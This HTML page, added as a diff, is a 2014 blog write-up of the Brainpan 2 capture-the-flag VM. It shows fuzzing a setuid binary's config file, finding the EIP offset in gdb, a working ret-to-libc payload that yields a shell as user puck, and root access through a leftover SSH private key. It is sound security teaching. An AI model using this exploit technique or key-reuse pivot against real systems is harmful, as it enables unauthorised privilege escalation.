@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Brainpan: 2 - Part 2 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-06-01">June 01, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/brainpan">brainpan</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Brainpan: 2 - Part 2</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h2 id="brainpan-1-8:57e48663af901e7c94c0472675ef84ed">brainpan-1.8</h2>
+
+<p>It was mentioned in the <code>notes.txt</code> file that <code>brainpan-1.8</code> works from a configuration file.  It also contains the following line:</p>
+
+<p><code>- Discovered buffer overflow in the command prompt, fixed as of version 2.0
+</code></p>
+
+<p>I didn&rsquo;t understand this line too well, at least it wasn&rsquo;t clear to me.  But I took it to mean there was a buffer overflow vulnerability which is still present in 1.8.</p>
+
+<pre><code class="language-text">$ ls -la
+-rwsr-xr-x 1 puck  puck  17734 Nov  4  2013 brainpan-1.8.exe
+-rw-r--r-- 1 puck  puck   1227 Nov  5  2013 brainpan.7
+-rw-rw-rw- 1 puck  staff    27 Nov  5  2013 brainpan.cfg
+  
+$ cat brainpan.cfg
+port=9333
+ipaddr=127.0.0.1
+</code></pre>
+
+<p>I downloaded brainpan-1.8.exe and brainpan.cfg to my Kali VM.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# file brainpan-1.8.exe 
+brainpan-1.8.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xcce373746445bee7531358c8b349018de08ec1f3, not stripped
+</code></pre>
+
+<p>Even though it has a <code>.exe</code> extension, it&rsquo;s actually an <code>ELF</code> executable.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# strings brainpan-1.8.exe 
+
+[...snip...]
+
+socket
+strcpy
+exit
+</code></pre>
+
+<p>There are is only one instance of strcpy in the binary - adjacent to a socket function.  I&rsquo;ve no idea if this is a valid assumption, but I figured this meant the vulnerable function would be part of the formation of that socket.  The configuration file handled the bind address and port and provides an easy method of manipulating the input to the application.</p>
+
+<p>I first tried fuzzing the port parameter.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# python -c 'print &quot;port=&quot; + (&quot;A&quot; * 100) + &quot;\n&quot; + &quot;ipaddr=127.0.0.1&quot;' &gt; brainpan.cfg  
+  
+root@kali:~/brainpan/2# ./brainpan-1.8.exe 
+port = 0
+ipaddr = 127.0.0.1
+[!] port not configured
+</code></pre>
+
+<p>No dice.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# python -c 'print &quot;port=0&quot; + &quot;\n&quot; + &quot;ipaddr=&quot; + (&quot;A&quot; * 100)' &gt; brainpan.cfg 
+  
+root@kali:~/brainpan/2# ./brainpan-1.8.exe 
+port = 0
+ipaddr = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�_
+[!] port not configured
+Segmentation fault
+</code></pre>
+
+<p>Wow, excellent.</p>
+
+<h2 id="gdb:57e48663af901e7c94c0472675ef84ed">GDB</h2>
+
+<p>The <code>EIP</code> offset is <code>44 bytes</code>.   A quick test to verify.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# python -c 'print &quot;port=0&quot; + &quot;\n&quot; + &quot;ipaddr=&quot; + (&quot;A&quot; * 44) + (&quot;B&quot; * 4) + (&quot;C&quot; * 452)' &gt; brainpan.cfg 
+  
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+  
+(gdb) i r
+eax            0xffffffff   -1
+ecx            0xb7fa736c   -1208323220
+edx            0x18 24
+ebx            0xb7fa5ff4   -1208328204
+esp            0xbffff4e0   0xbffff4e0
+ebp            0x41414141   0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0x42424242   0x42424242
+  
+(gdb) x/50x $esp -20
+0xbffff4cc: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff4dc: 0x42424242  0x43434343  0x43434343  0x43434343
+0xbffff4ec: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff4fc: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff50c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff51c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff52c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff53c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff54c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff55c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff56c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff57c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff58c: 0x43434343  0x43434343
+</code></pre>
+
+<p>Looking through the registers and memory stack, it appears as though I can overwrite <code>EBP</code>, <code>EIP</code> and a lot of the stack.  Overwriting <code>ESP</code> is not useful to me however, as this binary has been compiled with <code>NX</code> support.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/2# checksec --file brainpan-1.8.exe 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   brainpan-1.8.exe
+</code></pre>
+
+<p>This protection means that code located on the stack will not be executed, so even if I could find a JMP ESP insruction (of which there are none in the binary anyway), shellcode will not be executed.  A popular type of attack to bypass NX is called <code>ret-to-libc</code>.</p>
+
+<h2 id="return-to-libc:57e48663af901e7c94c0472675ef84ed">Return-to-libc</h2>
+
+<p>libc is the standard c library and provides multiple functionality for a programmer, including Operating System functions etc.  It makes it possible to call pre-loaded functions via this library, rather than having to inject your own code.  It bypasses the NX protection since nothing is being executed from the stack.</p>
+
+<p>I found I had to debug the binary directly on the brainpan 2 VM, as the functions were being loaded into memory in a different location than on my Kali VM (even with ALSR disabled).  I also had to copy the brainpan-1.8.exe binary and config file into /tmp, as I didn&rsquo;t have permissions to use GDB in the current directory (a hearty hat-tip to teh3ck for pointing that out to me :))</p>
+
+<p>I found the addresses where <code>system()</code> and <code>exit()</code> were loaded into memory.</p>
+
+<pre><code class="language-text">$ gdb ./brainpan-1.8.exe -q
+Reading symbols from /tmp/brainpan-1.8.exe...done.
+
+(gdb) b main
+Breakpoint 1 at 0x8048d3b: file brainpan-1.8.c, line 50.
+
+(gdb) r
+Breakpoint 1, main (argc=1, argv=0xbffffea4) at brainpan-1.8.c:50
+
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7fd0640 &lt;system&gt;
+
+(gdb) p exit
+$2 = {&lt;text variable, no debug info&gt;} 0xb7e8e550 &lt;exit&gt;
+</code></pre>
+
+<p>I have to pass a few variables into the system function.  The first is obviously the command to be executed, which I want to be <code>/bin/sh</code>.  In a normal shell this would already be defined as an environmental variable (verify this by typing env on your VM and you&rsquo;ll see something like <code>SHELL=/bin/bash</code>).  Doing this in my brainpan shell shows that no such variable is defined - so I did so by:</p>
+
+<pre><code class="language-text">$ cd /opt/old/brainpan-1.8
+$ export egg=&quot;/bin/sh&quot;
+</code></pre>
+
+<p>I used my <code>findaddr</code> binary to find the location of this new variable in memory:</p>
+
+<pre><code class="language-text">$ /tmp/findaddr
+egg =&gt; 0xbfffffcc
+</code></pre>
+
+<p>The second variable is a system return address - you don&rsquo;t strictly need this, but if a program does not exit cleanly it can often crash/core dump/leave logs etc.  So it&rsquo;s probably better practice to give correct exit functions where possible.  I used the <code>exit()</code> function for this, so that when I close my new shell, the brainpan-1.8.exe will also exit cleanly without crashing/seg faulting.</p>
+
+<p>The structure of the exploit goes: Padding + system() + exit() + /bin/sh.</p>
+
+<pre><code class="language-text">$ python -c 'print &quot;port=0&quot; + &quot;\n&quot; + &quot;ipaddr=&quot; + (&quot;A&quot; * 44) + &quot;\x40\x06\xfd\xb7\x50\xe5\xe8\xb7\xcc\xff\xff\xbf&quot;' &gt; brainpan.cfg
+  
+$ ./brainpan-1.8.exe
+port = 0
+ipaddr = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@��P�����������8
+                                                                      ��!h����������x�
+[!] port not configured
+
+$ id;whoami
+uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
+puck
+</code></pre>
+
+<h2 id="robin-goodfellow:57e48663af901e7c94c0472675ef84ed">Robin Goodfellow&hellip;</h2>
+
+<p>&hellip; I mean Puck&hellip;</p>
+
+<p>I could now access puck&rsquo;s home directory.</p>
+
+<pre><code class="language-text">$ cd /home/puck
+$ 
+$ ls -la
+drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup
+-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history
+-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout
+-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc
+-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile
+drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh
+</code></pre>
+
+<p>As with the user anansi, I copied my public key into <code>.ssh/authorized_keys</code> and SSH&rsquo;d in through my existing tunnel.</p>
+
+<p>So far, the <code>.bash_history</code> file for all the users has been empty.  But the <code>.bash_history</code> file inside <code>.backup</code> still has some content - and very enlightening it was too.</p>
+
+<pre><code class="language-text">puck@brainpan2:~$ cat .backup/.bash_history
+[...snip...]
+ssh -l &quot;root &quot; brainpan2
+[...snip...]
+mkdir .backup
+mv .ssh .bash* .backup
+</code></pre>
+
+<p>It appears as though puck has the ability to SSH as the real root user.  It&rsquo;s evident that after the backup directory was created, the SSH Keys were moved inside.</p>
+
+<pre><code class="language-text">puck@brainpan2:~$ ls -la .backup/.ssh
+$ ls -la
+-rw------- 1 puck puck 1675 Nov  4  2013 id_rsa
+-rw-r--r-- 1 puck puck  396 Nov  4  2013 id_rsa.pub
+</code></pre>
+
+<p>The files are still there, so I gave it a try&hellip;</p>
+
+<pre><code class="language-text">puck@brainpan2:~$ ssh &quot;root &quot;@127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa
+root@brainpan2:~# id; whoami
+uid=0(root ) gid=0(root ) groups=0(root )
+root
+</code></pre>
+
+<h2 id="flag:57e48663af901e7c94c0472675ef84ed">Flag</h2>
+
+<p><code>root@brainpan2:~# cat /root/flag.txt</code></p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-2/flag.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>w00t.</p>
+
+<p>Special thanks to:</p>
+
+<ul>
+<li><a href="https://twitter.com/superkojiman">superkojiman</a> for creating a great challenge,</li>
+<li><a href="http://vulnhub.com/">VulnHub</a> for hosting,</li>
+<li><a href="https://twitter.com/teh_h3ck">teh3ck</a> for his kind words of encouragement.</li>
+</ul>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
